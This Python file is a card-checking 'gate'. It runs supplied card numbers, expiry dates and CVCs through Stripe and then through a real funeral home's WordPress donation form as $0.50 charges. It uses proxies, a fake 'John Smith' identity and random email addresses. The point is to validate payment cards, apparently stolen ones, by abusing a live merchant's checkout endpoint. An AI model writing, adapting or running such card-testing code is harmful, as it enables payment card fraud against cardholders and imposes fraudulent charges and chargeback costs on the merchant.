"""
Corrigan Funerals - Stripe Donation Gate ($0.50)
WordPress Full Stripe inline donation form.
"""
import requests
import random
from typing import Tuple

def corrigan_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy: str = None) -> Tuple[str, bool]:
    """
    Check card via Corrigan Funerals donation form.
    Amount: $0.50 donation
    
    Returns:
        Tuple[str, bool]: (response_message, proxy_alive)
    """
    try:
        session = requests.Session()
        timeout = 20
        
        if proxy:
            session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        yy = card_yer.strip()
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        
        random_suffix = random.randint(100, 999)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=John+Smith&card[number]={card_num}&card[cvc]={card_cvc}&card[exp_month]={card_mon}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'
        
        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=timeout)
        
        try:
            pm = response.json()['id']
        except (KeyError, ValueError):
            error_msg = response.json().get('error', {}).get('message', 'Invalid card')
            return error_msg, True
        
        headers = {
            'authority': 'www.corriganfunerals.ie',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.corriganfunerals.ie',
            'referer': 'https://www.corriganfunerals.ie/pay-funeral-account/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'pay-funeral-account',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-custom-input[]': ['John', 'Smith', 'Payment'],
            'wpfs-card-holder-email': f'johnsmith{random_suffix}@gmail.com',
            'wpfs-card-holder-name': 'John Smith',
            'wpfs-stripe-payment-method-id': pm,
        }
        
        response = session.post('https://www.corriganfunerals.ie/cfajax', headers=headers, data=data, timeout=timeout)
        
        try:
            result = response.json().get('message', 'Unknown response')
            return result, True
        except (KeyError, ValueError):
            return "API Error: Invalid response", True
            
    except requests.exceptions.Timeout:
        return "Timeout", False
    except requests.exceptions.ProxyError:
        return "Proxy Error", False
    except Exception as e:
        return f"Error: {str(e)}", True
